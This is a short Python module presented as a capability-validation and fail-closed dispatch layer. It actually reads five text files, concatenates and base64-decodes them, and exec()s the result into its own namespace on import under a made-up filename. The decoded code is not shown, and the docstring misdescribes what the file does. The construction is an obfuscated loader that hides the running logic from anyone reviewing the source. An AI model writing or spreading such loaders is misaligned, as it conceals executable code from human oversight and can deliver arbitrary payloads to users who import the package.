"""Central capability validation and fail-closed module dispatch."""
from __future__ import annotations

import base64
from pathlib import Path

_parts = []
_dir = Path(__file__).parent
for _i in range(5):
    _parts.append((_dir / f"_orch_b64_{_i}.txt").read_text(encoding="utf-8"))
_code = base64.b64decode("".join(_parts)).decode("utf-8")
exec(compile(_code, str(_dir / "_orchestrator_main.py"), "exec"), globals())
